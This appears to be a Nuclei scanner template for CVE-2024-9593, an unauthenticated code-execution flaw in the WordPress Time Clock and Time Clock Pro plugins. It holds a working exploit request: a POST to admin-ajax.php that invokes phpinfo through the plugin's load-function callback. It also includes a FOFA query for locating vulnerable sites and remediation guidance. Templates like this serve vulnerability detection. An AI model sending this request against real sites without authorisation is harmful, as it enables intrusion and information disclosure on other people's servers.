flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "/wp-content/plugins/time-clock")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    part: body
    regex:
    - '>PHP Version <\/td><td class="v">([0-9.]+)'
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - PHP Extension
    - PHP Version
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    function=phpinfo

    '
id: CVE-2024-9593
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-9593
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-94
    epss-percentile: 0.99104
    epss-score: 0.80841
  description: 'The Time Clock plugin and Time Clock Pro plugin for WordPress are
    vulnerable to Remote Code Execution in versions up to, and including, 1.2.2 (for
    Time Clock) and 1.1.4 (for Time Clock Pro) via the ''etimeclockwp_load_function_callback''
    function. This allows unauthenticated attackers to execute code on the server.
    The invoked function''s parameters cannot be specified.

    '
  impact: 'Unauthenticated attackers can execute limited PHP functions on the server
    through the etimeclockwp_load_function_callback function, potentially exposing
    sensitive system information through phpinfo and other callable functions.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/time-clock/" || body="/wp-content/plugins/time-clock-pro/"
    framework: wordpress
    max-request: 2
    product: time-clock & time-clock-pro
    vendor: scott_paterson
    verified: true
  name: Time Clock <= 1.2.2 & Time Clock Pro <= 1.1.4 - Remote Code Execution
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/detail/time-clock-122-unauthenticated-limited-remote-code-execution
  - https://nvd.nist.gov/vuln/detail/CVE-2024-9593
  - https://github.com/RandomRobbieBF/CVE-2024-9593
  remediation: 'Update Time Clock plugin to a version later than 1.2.2 or Time Clock
    Pro plugin to a version later than 1.1.4 to address the remote code execution
    vulnerability.

    '
  severity: high
  tags: cve,cve2024,time-clock,wp,wordpress,wp-plugin,rce,time-clock-pro,vkev,vuln
